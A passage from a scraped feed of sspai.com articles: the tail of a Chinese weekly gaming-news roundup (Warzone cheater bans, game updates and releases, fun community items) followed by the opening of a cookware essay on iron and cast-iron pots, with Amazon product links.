src=\"https://cdn.sspai.com/editor/u_/c4onr75b34t82k08gadg.jpeg\"></figure><p>《使命召唤：战区》 (Call of Duty: Warzone)官方宣称一天之内就封禁了超过 10 万个作弊玩家的账号，并且主要针对「重复作弊者」和「作弊工具提供者」。由于这款游戏免费，作弊者即使被封号，也很快可以注册新账号继续作弊，这也是导致作弊账号较多的原因之一。但是官方针对「重复作弊者」采用了强硬的「硬件封禁」手段——在被封禁的硬件上，玩家无论登录哪个账号都无法进行游戏，甚至还无法注册新账号。 <a href=\"https://twitter.com/RavenSoftware/status/1430587371217637387\" target=\"_blank\">🔗</a></p>\n<h3>《小小梦魇 2》免费强化版</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr7lb34t82dsrfn1g.png\"></figure><p>《小小梦魇 2》（Little Nightmares II）在 PS5 / Xbox Series X|S / PC 平台推出了免费的强化版。玩家可以在次世代主机上以 4K + 60 帧画面体验游戏，并支持光线追踪、3D 空间音效、进化的粒子效果等特性。 <a href=\"https://www.youtube.com/watch?v=Cxem5wzTXpE\" target=\"_blank\">🔗</a></p> <h3>《灵魂旅者》更新</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr8db34t82k08gae0.jpeg\"></figure><p>《灵魂旅者》（Spiritfarer）推出夏季免费更新「Beverly」。 <a href=\"https://thunderlotusgames.com/support/spiritfarer/technical/patch-notes-spiritfarer/\" target=\"_blank\">🔗</a></p>\n<h3>《杀手 3》DLC</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr8lb34t82dsrfn20.jpeg\"></figure><p>《杀手 3》的大型付费 DLC「七宗罪」（Seven Deadly Sins）系列的第五章「暴食」（Gluttony）于 8 月 31 日发布，这一章重回修改后的重庆地图。 <a href=\"https://www.ioi.dk/hitman-3-season-of-gluttony/\" target=\"_blank\">🔗</a></p> <h3>《好狗狗星系》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr8tb34t82k08gaeg.png\"></figure><p>《好狗狗星系》（Goodboy Galaxy）是一款在 Kickstarter 上众筹的 GBA 游戏，众筹目标是 33351 美元，然而目前已筹到超过 20 万美元，达到了众筹目标的 630%。由于众筹还远没结束（还剩 20 多天），众筹金额仍在持续增加中。游戏支持中文，并且将登陆 PC 和 Switch 平台。瞎玩菌发现这款游戏现在有免费的 <a href=\"https://hotpengu.itch.io/goodboy-galaxy-demo\" target=\"_blank\">demo</a> 可供玩家通过 Web 浏览器在线体验，并且 demo 也支持中文，还可以全屏游玩。 <a href=\"https://www.kickstarter.com/projects/penguinrik/goodboy-galaxy-exploration-platform-game-gba-pc-and-switch\" target=\"_blank\">🔗</a></p>\n<h3>《人类》</h3>\n<p>热门新游《人类》（HUMANKIND）的开发商计划把 MOD 工具尽快开放给玩家。 <a href=\"https://www.games2gether.com/amplitude-studios/humankind/blogs/780-what-s-next-for-humankind?page=1\" target=\"_blank\">🔗</a></p>\n<h3>《影子战术：将军之刃》DLC</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr95b34t818p9aoh0.jpeg\"></figure><p>《影子战术：将军之刃》（Shadow Tactics: Blades of the Shogun）的 DLC「爱子的选择」（Aiko's Choice）公布了新的玩法演示预告片。这款 DLC 甚至无需本体就能独立游玩，但还是建议你至少打完主游戏的前几个任务，以便对游戏的机制以及角色和故事有所了解。这款 DLC 计划于 2021 年 12 月发行。 <a href=\"https://store.steampowered.com/news/app/1579380/view/2960541741559461659\" target=\"_blank\">🔗</a></p>\n<h3>《盐与献祭》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr9db34t82k08gaf0.png\"></figure><p>《盐与避难所》开发商的新作《盐与献祭》（Salt &amp; Sacrifice）公布了多人玩法演示视频，游戏将于 2022 年初登陆 PS4 / PS5 平台。 <a href=\"https://www.youtube.com/watch?v=DljZ9-pW8I0\" target=\"_blank\">🔗</a></p> <h3>《星域》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onr9lb34t82k08gafg.jpeg\"></figure><p>《星域》（Starfield）通过 3 段开发者讲解的视频，介绍了游戏中的 3 个地点：欢愉之城「霓虹」（<a href=\"https://www.youtube.com/watch?v=E2io6xFD1VY\" target=\"_blank\">Neon</a>）、联合殖民地首都「新亚特兰蒂斯」（<a href=\"https://www.youtube.com/watch?v=KoZAAebhnxs\" target=\"_blank\">New Atlantis</a>）和自由星系联盟首都「阿基拉城」（<a href=\"https://www.youtube.com/watch?v=F_wrs9NlEfI\" target=\"_blank\">Akila</a>）。注：点击英文名即可跳转 YouTube 查看原视频，支持选择简体中文字幕。 <a href=\"https://www.polygon.com/22644692/bethesda-starfield-planets-locations-neon-akila-new-atlantis\" target=\"_blank\">🔗</a></p>\n<h3>《死亡循环》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/3a4e254554aca52d67fe0abb2b8f79d9.jpg\"></figure><p>预计 9 月 14 日发售于 PS5 和 PC 平台的《死亡循环》（Deathloop）已经提前对多家媒体解禁，其中 The Verge 称之为「一个包裹在射击游戏中的谜团」，并且说这款游戏有点像设定在美剧《迷失》（Lost）中的小岛上的《羞辱》（Dishonored）。 <a href=\"https://www.theverge.com/2021/8/26/22642628/deathloop-hands-on-preview-ps5-pc-arkane\" target=\"_blank\">🔗</a></p>\n<h3>《GTA 6》</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onra5b34t82k08gag0.jpeg\"></figure><p>配音演员 Dave Jackson 在自己的 Facebook 上声称自己将为《GTA》系列新作中的角色「麦克莱恩警长」（Captain McClane）配音，他是从制作人那里获得的正式消息，并且他希望这个新作就是《GTA 6》（而不是《GTA 线上模式》）。 <a href=\"https://www.reddit.com/r/GTA6/comments/pcfr0h/voice_over_actor_confirms_a_character_role_in_the/\" target=\"_blank\">🔗</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4onradb34t818p9aoi0.jpeg\"></figure><h2>彩蛋</h2>\n<p>「彩蛋」版块旨在分享有趣或有料的游戏相关内容，但不是严肃的游戏新闻。内容来源不限于玩家社群，MOD，二创，同人或 ACG 衍生的亚文化等。</p>\n<h3>🌈🥚1 在《WHATEVER》里开着巨轮漂移</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onralb34t82k08gagg.gif\"><figcaption>GIF 动画的品质较低，敬请谅解。</figcaption></figure><p>《WHATEVER》是一个灵感来自「长赐号」巨轮搁浅的 PC 游戏，虽然还不能玩到，但是这款游戏已经以抢先体验状态上架 <a href=\"https://store.steampowered.com/app/1734230/WHATEVER/\" target=\"_blank\">Steam</a> 平台，你可以先加个愿望单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrbdb34t82k08gah0.gif\"></figure><p>玩家可以控制一艘大船沿着蜿蜒的河流漂流，经过各种障碍物，从岩石到巨大的怪物，尽量不要撞到任何东西，不要被卡住。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrclb34t82k08gahg.gif\"></figure><p>由于这艘大船的惯性很大，你甚至可以开着船漂移。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrddb34t82dsrfn2g.gif\"></figure><p>开发者声称这款游戏将在「船准备好了之后」正式发行。</p>\n<h3>🌈🥚2 《Jill's Day》英文版现已免费公开</h3>\n<p>在 7 月 2 日的 <a href=\"https://sspai.com/post/67484\" target=\"_blank\">游戏周报</a> 最后一个彩蛋里，瞎玩菌曾经分享过《赛博朋克酒保行动》的玩家二创游戏《Jill's Day》，但是当时游戏只支持日文。</p>\n<p>如今这款游戏的 <a href=\"https://guanoice.itch.io/jillsdaydemo-eng\" target=\"_blank\">英文版</a> 已经上线，你可以通过 Web 浏览器在线游玩，可以全屏，并且还支持手柄操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrdtb34t813bf0vd0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onre5b34t818p9aoig.png\"></figure><p>GameBoy 画风真是惹人喜爱啊！</p>\n<h3>🌈🥚3 使用 AI 将《街霸》角色的脸真人化</h3>\n<p>俄罗斯的《街霸》玩家 <a href=\"https://twitter.com/Siberian_644/status/1432349414941773830\" target=\"_blank\">Siberian_644</a> （他的页面有更多对比图片）通过一个名叫 <a href=\"https://minimaxir.com/2021/04/styleclip/\" target=\"_blank\">StyleCLIP</a> 的 AI 模型实现了这样的转换。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4onre5b34t82dsrfn30.jpeg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onredb34t82k08gai0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrelb34t82k08gaig.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onretb34t813bf0vdg.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrf5b34t813bf0ve0.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrfdb34t818p9aoj0.png\"></figure><h3>🌈🥚4 《星露谷物语》首届电竞比赛奖金高达 40000 美元</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrflb34t82dsrfn3g.png\"></figure><p>《星露谷物语》（Stardew Valley）的创造者将于 9 月 4 日举办一个速通比赛「<a href=\"https://twitter.com/ConcernedApe/status/1429114336472027138\" target=\"_blank\">星露谷物语杯</a>」，获胜者将赢得 40000 美元的奖金。</p>\n<p>没想到吧？这个以种田、钓鱼、交友闻名的休闲游戏要如何「电竞」？</p>\n<p>官方表示，这是一场技能、知识和团队合作的比赛，他们想出了 100 多个特别的挑战，供玩家完成，以赚取积分并在排行榜上排名。玩家需要 4 人组队参赛，有 3 个小时的时间来尝试和完成尽可能多的挑战，每个队伍需要自行决定如何分工和安排挑战次序。像在矿井中达到 120 级这样的任务（值 10 分），即使是 4 个人的团队也需要接近 1 个小时才能完成。</p>\n<p>这样的比赛，你想看吗？（官方将会在 <a href=\"http://twitch.tv/UnsurpassableZ\" target=\"_blank\">Twitch</a> | <a href=\"https://www.youtube.com/c/UnsurpassableZ/videos\" target=\"_blank\">YouTube</a> 上直播）</p>\n<h3>🌈🥚5 玩电脑的时候，想要椅子带按摩、加热、通风怎么办？</h3>\n<p>某些垃圾佬的答案是：魔改汽车座椅！</p>\n<p>根据微博@<a href=\"https://weibo.com/2169039837/KuP0CucTC\" target=\"_blank\">karminski-牙医</a> 的图片，在闲鱼上淘一个别克 GL8 的汽车座椅（还带安全带……）仅需 260 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4onrg5b34t82dsrfn4g.jpeg\"></figure><p>拿回来一番魔改，自己焊上一块钢板，再加装滑轮，甚至还可以接 12V 电源实现电动调节。</p>\n<p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68594"},{"title":"不买可以先收藏 08：先接住一口好锅，再做出一桌好菜","date":"2021-09-03 06:19:18","description":"\n<p>烹饪最大的乐趣就是你可以组合不同食材和工具创造出非凡的食物，于是从小便是过家家爱好者的我在真正拥有自己的房子后便迫不及待的冲向了消费主义陷阱——而这陷阱叠加在厨房里简直就是深渊。除了层出不穷源源不断的可购买物件之外，其实我是清醒的知道很多东西重复又多余，但就是想要买，无论它只是同样的材质和用途换了一种形态，还是它仅仅帮助我节省了三秒钟，我都会快乐。在诸多「买了就是开心，不买日子也照常过」的东西里，那琳琅满目的四十几口锅承载了我最多的幸福。</p>\n<p>对于喜爱烹饪的人来说，锅的「好用」会被拆解出很多理由：你今天的菜单、灶具的大小、用餐的对象乃至此刻的心情，都能影响并决定今日谁才是天选之子。所以当你拥有很多锅以后，那些原本很复杂的菜式也会变得可爱起来，因为好的工具能让我在烹饪过程中油然而生一种满足和自我感动，看起来不是啥好词儿，但平凡的日子里不都是靠着这些自以为是的小情绪慢慢流淌着么。</p>\n<h2>锅是器物，也是形随机能生的艺术</h2>\n<p>百万年前人类意识到火与食物的关系，炊具也随之而生，百万年后的今天即便再五花八门，无论是商场里买赠的煎锅炒锅高压锅，还是百思不得其解的 Staub、Le Creuset 和 Finex，其实它们本质上就是一个「热传递」的器具，所以我们需要对它们有一个相对清醒的认知——你买这玩意儿花的钱是花在感官享受上了，还是真真切切的功能质量上，虽然两者都可取，但心里也得有个谱。</p>\n<h2>锅具分类</h2>\n<p>锅的分类有两种，一种是功能性，另一种是材质。前者取决于你的菜单，后者更多是你的烹饪习惯。从功能性上讲，我们常见的锅有：</p>\n<ol>\n<li>炒锅</li>\n<li>煎锅</li>\n<li>炖锅</li>\n<li>煮锅</li>\n<li>高压锅</li>\n</ol>\n<p>而若是以材质来梳理，则复杂了很多。前文提到锅的本质就是热传递，所以当讨论材质时，就必须关注其两个性质：导热性和热容量，前者是物质被加热到理想温度的速率，后者则是指加热后温度能被储存的时间。</p>\n<p>以市面上最常见的三种用作锅具制作的金属铜、铁和铝来讲，如果按照导热性来比，从强到弱为铜 &gt; 铝 &gt; 铁，但若是以热容量来讲，则变成铝 &gt; 铁 &gt; 铜。当然还有一个更被人熟知的不锈钢锅，但是你只需要知道它的导热性和热容量几乎都是垫底就好了，</p>\n<p>这样看来，好像如果我经常爆炒，那么买铜锅，如果炖汤比较多则选择铝锅，好像是很简单的事儿。其实不然，铜锅和铝锅数据上看起来很好，但它们都有一个致命的缺点就是性质较为活跃容易与酸性物质产生反应，特别是铝材质较软，且铜锅在高温下还容易氧化，更容易生锈，虽然它们都是人体必需的微量元素，但铜和铝更容易因为各种原因被人体吸收，而且过量后毒性巨大，所以目前市面上常见的铜锅或者铝锅更多是合成锅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7rdb34tcuopj7uug.jpeg\"></figure><p>例如美国知名高端厨具品牌 All-Clad 的 COPPER CORE® 系列锅具就采用了不锈钢、铜和铝的五层结构铸造，前文虽然吐槽了不锈钢较低的物理特性，但它有一个目前大部分金属无法比拟的便利性——不容易发生反应、硬度尚可并且便于清洁，当用它作为接触面并依托其它更好的金属做热传递，是目前新技术下非常靠谱的解决方案。</p>\n<h3>我最喜欢的还是铁锅</h3>\n<p>但复合材料的锅具通常价格不菲，而且过于精致，所以我更喜欢古朴风格的铁锅。作为伴随人类最久且用途最广泛的金属，铁可以说是在厨房被玩出了花儿。</p>\n<p>首先虽然统称铁锅，但大多数时候我们还需要分开来讨论熟铁锅还是生铁锅。</p>\n<h4>熟铁锅里有深刻但也模糊的回忆</h4>\n<p>如果回想起小时候家里的厨房，很多人一定都记忆犹新那口油油腻腻的小黑锅，好像永远洗不干净，却又总能在外婆妈妈的翻动飞舞下盛出最不可替代的味道——这便是熟铁锅。</p>\n<p>熟铁锅顾名思义便是生铁加热后锻造而成的，也是我们大部分语境下的「铁炒锅」。因为剔除杂质后碳和其它元素减少，所以熟铁锅通常硬度更高，经过锤打锻造后厚度也减少，并且不容易与其它元素发生反应，可以自如烹饪大部分食材并且适应任何材质的铲子。同时考虑到铁的成本，所以一直以来熟铁锅都是最多家庭使用的炒锅。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7rlb34tcvciqad80.jpeg\"><figcaption>臻三环「宗师锅」</figcaption></figure><p>中式烹饪有一个很玄乎的讲究叫「锅气」，你很难定义它具体的味道或者烹饪效率，可但凡熟悉厨房的人一定都会觉得「铁锅点火做出来的炒菜才是最好吃的」，是各种电磁炉电陶炉或者其它材质锅具烹饪不出来的体验。所以我花重金买了一口熟铁炒锅，是前几年热热闹闹的臻三环章丘铁锅，近两千块的售价声称经过了三万多锤的手工锻造而成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7rtb34tcuopj7uv0.jpeg\"><figcaption>用大铁锅做一些大火高油的爆炒有一种很难言喻的「场景感」</figcaption></figure><p>当然这里不讨论智商税或者所谓的「三万锤」是否有实际意义，因为这口锅更多是我对记忆的一种复现，而且有一说一，它也的确很好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7slb34tcuopj7uvg.png\"><figcaption><a href=\"https://www.kankuma.co.jp/en_product_category/en_product5\" target=\"_blank\">图源</a></figcaption></figure><p>值得一提的近年来市面上还出现了一种新型铁锅，<a href=\"http://www.riverlight.co.jp/zh-tw/story.php\" target=\"_blank\">它起源于日本被称为「窒化铁锅」，到了国内则常被称为「氮化铁锅」，</a>其实这并不是什么黑科技或者新技术。简单来讲它就是在熟铁锅的表面进行一层氮化处理，使得氮原子渗透到铁原子晶格内部，让铁锅具备很好的防锈能力，防腐蚀能力和硬度都有一定程度的提升，是熟铁锅工艺一种锦上添花的升级。</p>\n<h4>生铁锅是厨房里美妙且庄重的仪式</h4>\n<p>与熟铁锅相反的是生铁锅，它有一个更被熟知的名字叫「铸铁锅」。我觉得每个立志要在厨房大有作为的人都对铸铁锅有一种莫名其妙的执念，像我当时地砖都还没有开始铺就已经收到了好几个国际快递来的铸铁锅，至于为什么是国际快递，我稍后一点再说。</p>\n<p>生铁锅与熟铁锅的区别重点并不在于我们传统语境里的「生熟」，它们都是铁锅，前面提到熟铁锅经过加热后剔除杂质，那么生铁锅相反则是直接从铁矿里开采出来的铁原石未经过多淬炼制成的铁锅，所以它所含元素比较复杂，延展性较低，通常都很厚重，但这也带来了另一个优势，就是它拥有非常好的热容量，这在煲汤炖肉的时候尤其实用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7stb34tcu4bur2jg.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B000SAFVCO/ref=ppx_yo_dt_b_asin_image_o04_s02?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">staub 24cm 珐琅锅</a></figcaption></figure><p><a href=\"https://www.amazon.cn/gp/product/B000SAFVCO/ref=ppx_yo_dt_b_asin_image_o04_s02?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">我最常用的是一口铸铁锅是 staub 的 24cm 标准款，</a>作为一口锅来说价格不便宜，但哪怕只作为一口锅来说它也真的能带给人快乐。</p>\n<p>区别于大部分铸铁锅，staub 有一个特点或者说另一个更容易被人记住的名字叫「珐琅锅」，是指在铸铁锅身上浇铸了一层珐琅，这可不只是为了好看。珐琅同样有一个更熟悉的名字叫「搪瓷」，也就是大多数人小时候见过的那种白色大缸子一样的材料，它主要由物理、化学性质单一，对人体几乎没有任何危害的陶瓷或玻璃粉末构成，经熔结后形成坚硬的外壳，除了装饰作用更能保护。</p>\n<p>一直以来都有一些针对铸铁锅造成重金属中毒的报道或研究，正如前文提到铸铁锅通常由未经淬炼的铁原石成型，并没有剔除内里所含的其它重金属元素，所以一层坚硬的珐琅保护可以在一定程度上减少被重金属侵害的风险。当然另一个需要注意的是也尽量选购正规厂商出售的铸铁锅，因为除了利用直接开采的铁原石，一些不良商家更可能使用廉价的回收铁制成售卖，那样来历不明甚至可能是工业用途的废铁隐患更大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7t5b34tcvciqad90.jpeg\"></figure><p>而 staub 另一个特点是它锅盖上的积水凸点。因为铸铁锅通常比较厚重，也不会和其它锅具一样在盖儿上留个透气孔，所以普遍密封性较好，而有了这些凸点后在关盖烹煮食物时水蒸气上升遇到这些凸点会迅速凝结成水滴滴落，尽可能减少水分流失，这也是大家喜欢用 staub 做无水料理的原因。一个 Tips 是在盖上盖儿后可以在上面放一些冰块，增加水蒸气凝结的效率。</p>\n<p>高热容量对煲汤炖肉最主要的优势是省气，当锅里沸腾后即便把炉灶拧到最小火，锅内也能持续保持沸腾，另外值得一提的是当我们煲汤炖肉时最好是保持微微沸腾的状态即可，这样可以在保证食材软烂的同时不会因为激烈的沸腾而导致稀碎。<a href=\"https://www.amazon.cn/gp/product/B000RC0MK4/ref=ppx_yo_dt_b_asin_image_o04_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">我还买了同款的另一个尺寸 28cm 锅，</a>更适合做高汤、卤味之类的「大满足」。</p>\n<p>当然可能有的人喜欢使用高压锅，但我其实更喜欢小火慢炖出的「火气」，所以高压锅我实际使用频率非常低，就不详细介绍，<a href=\"https://www.amazon.cn/gp/product/B07C5TGMZ7/ref=ppx_yo_dt_b_asin_image_o04_s01?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">但推荐我在用的一款质感和做工非常好的 WMF 旋钮高压锅，</a>和传统高压锅的区别就是它把释压和压力段的控制放在了手柄上，操作更方便也更安全。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7tdb34tcu4bur2k0.jpeg\"></figure><p>高热容量的另一个运用是煎牛排。煎牛排是一件「争分夺秒」的事儿，时间不够肉到达不了理想的熟度，太多了最后成品则味同嚼蜡，中间还有一个很重要的变量就是锅温。高热容量的铸铁锅意味着能够储存更多的热能，这样牛排在下锅后不会对锅子整体的温度造成急剧降温的影响；但若是较薄的锅子热容量不够牛排下去后温度仅够将表面煎焦，然后再花数十秒的时间让锅子回到原本的温度，相比一直「恒温」传递的铸铁锅，普通锅子可能已经把牛排表面折腾冒烟儿了里面的肉还是血红。</p>\n<h4>铸铁锅与艺术与做作与仪式感与实用兼备</h4>\n<p>前文卖了一个「为什么我的铸铁锅要漂洋过海」的关子，放到现在来讲是因为此刻你大概已经了解了铸铁锅的特性——通常比较厚重且热容量大，这也意味着铸铁锅天然有一种古朴的风味并且它可以不只局限于作为锅子使用。</p>\n<p>要说到古朴，就不得不提日本，作为对文化传承最重视的国家之一，他们既有现代审美又暗藏历史气息的手工艺品一直闻名于世，铁器亦然，而一直让我念念不忘的是来自日本的「南部铁器」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7ttb34tcvt9nu9gg.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B000I0LBKU/ref=ppx_yo_dt_b_asin_image_o07_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">岩手县知名品牌之一 OIGEN 的「丸鍋」</a></figcaption></figure><p>约四百年前的庆长年间，日本藩主南部立直公从江户迁居至盛冈（现今的岩手县），并在当地修建都城，包括城建器物乃至士兵盔甲都需要重新打造，而盛冈当地自古以来就盛产品质优良的铁矿砂、岩铁和木炭等原料，非常适合发展铸造产业，可因为技术落后所以从全国各地请来了非常多优秀的铸物师定居当地生产制造铁器。后面到了藩主利雄继位，因为他非常热衷于茶道，城内便又兴起了茶器的铸造，再由此衍生到生活中的其它铁器，最后该地以盛产铸造铁器闻名于世。从某种意义上来讲，它的意义可能类似于中国景德镇的瓷器产业。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7u5b34tcvciqad9g.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B000GHHE4W/ref=ppx_yo_dt_b_asin_image_o07_s02?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">岩手县知名品牌之一 OIGEN 的「ダッチオーブン天火」</a></figcaption></figure><p>所以「南部铁器」通常不指代某个具体的品牌，而是来自日本岩手县生产的锅子，其中我最喜欢的品牌之一就是 OIGEN，我买了好几个他家的锅子并且至今没有舍得用过，多美啊。不过相比南部铁器或者 OIGEN，我想很多人一定听说过「柳宗理」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7udb34tcvt9nu9h0.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B0011Z3P2S/ref=ppx_yo_dt_b_asin_image_o03_s01?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">柳宗理铸铁煎锅</a></figcaption></figure><p>作为日本最负盛名的艺术与建筑大师，柳宗理也设计过不少生活器物，相比我们常见的「锅柄」，柳<a href=\"https://www.amazon.cn/gp/product/B0011Z3P2S/ref=ppx_yo_dt_b_asin_image_o03_s01?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">宗理的很多煎锅烤盘都会在沿侧有一个巨大的流线型把手，</a>美得怦然心动，但也会止不住好奇「这真的好用吗」？长柄把手最主要的优势是隔热和拿取，但其实并不适用于铸铁锅，一方面铸铁锅本身比较厚重，即使单柄但大部分时候也需要双手才能拿起；其次若一体成型会非常烫手，但铸铁锅另一个常见的用途是直接放进烤箱，如果使用隔热的木柄或者橡胶柄则失去了这个特点。</p>\n<p>而这种加大加宽版的设计相比传统的双耳拥有了更好的持稳，特别是当你戴着隔热手套的时候。柳宗理很多产品的设计原则是「手中成型」，我们见到的大多数产品设计在设计之初都是先经过纸上绘图，事无巨细的考量好每个尺寸、角度和比例再投入生产，但柳宗理的产品是用石膏在手上不断体验、调整和打磨，除非你真正拿在手上，不然仅凭双眼是很难体验到它那些让你乍然惊叹的巧思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7ulb34tcuopj7v00.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B01MDP6J23/ref=ppx_yo_dt_b_asin_image_o03_s01?ie=UTF8&amp;th=1&amp;tag=adav800-23\" target=\"_blank\">柳宗理铸铁平底锅</a></figcaption></figure><p><a href=\"https://www.amazon.cn/gp/product/B01MDP6J23/ref=ppx_yo_dt_b_asin_image_o03_s01?ie=UTF8&amp;th=1&amp;tag=adav800-23\" target=\"_blank\">柳宗理另一个值得玩味的设计是它非常有标志性的平底锅，</a>锅上的两个大缺口其实会看到不少吐槽，大都集中在说这么大的缺口对倒出汤汁有点矫枉过正。我不知道这样说的人是否真正的用过这口锅或者具备一定程度的烹饪技艺，平底锅通常就不是用来烹饪汤汁多的食物，更多的用法是「煎」，煎蛋煎牛排鸡排鱼排，特别是当煎溏心蛋或者嫩鱼排的时候，即便是锅铲都很难将其起锅的，但是大缺口的存在轻斜锅身就能移动到容器里。</p>\n<p>「形随机能生」是很多日式食器的特点，但我认为日式食器更胜一筹的是它将两者相辅相成都顶到了极致，因为过分注重需求与实用的设计导致它们不落俗套有一种更吸睛的别致，你怀着「买了个花瓶」的心态尝鲜最后竟发现它又无比顺手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7utb34tcuopj7v0g.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B07X4HJHQY/ref=ppx_yo_dt_b_asin_image_o01_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">DOSHISHA 寿喜烧锅</a></figcaption></figure><p>「寿喜烧」是日本的「重庆火锅」，区别在于它是煎煮兼备，但毕竟是异域的饮食，所以之前通常都是在同一口锅里先吃饱了煎肉再下出汁和调配的酱料煮蔬菜豆腐菌菇，倒也不是不能吃，只是整个体验是割裂的。我知道很多人无法想象「只为了一道菜买个锅」的做作，但我相信他们也很难想象当你用最合适的姿势体验某道可以常吃常新美食时的愉悦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7v5b34tcvt9nu9hg.jpeg\"></figure><p>但其实不止是感性的舒适，<a href=\"https://www.amazon.cn/gp/product/B07X4HJHQY/ref=ppx_yo_dt_b_asin_image_o01_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">DOSHISHA 这个高热容量的铸铁锅</a>可以保证即便是长时间的最小火供给都能拥有沸腾的热汤和滋啦作响的肥牛片，肥牛片一定要先裹一遍汤汁再开始煎烤，然后裹一圈生食蛋液再入口，这是寿喜锅能给的无以伦比的快乐。</p>\n<p>「仪式感」是一种可褒可贬的描述，但至少在家用场景下，我觉得能取悦自己的仪式感就是疲惫生活里的英雄梦想，是支持每一个清晨准点醒来的推动力，所以我从不吝啬在家里特别是厨房购置一些「看起来可有可无」的东西，幸运的是至少在铸铁食器这一块它总能兼顾实用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4mu7vtb34tcvciqada0.jpeg\"><figcaption><a href=\"https://www.amazon.cn/gp/product/B0009JKG9M/ref=ppx_yo_dt_b_asin_image_o03_s00?ie=UTF8&amp;psc=1&amp;tag=adav800-23\" target=\"_blank\">Lodge 铸铁锅</a></figcaption></figure><p>除了前文提到的煎牛排，我还买了很多 Lodge 的铸铁锅，<a 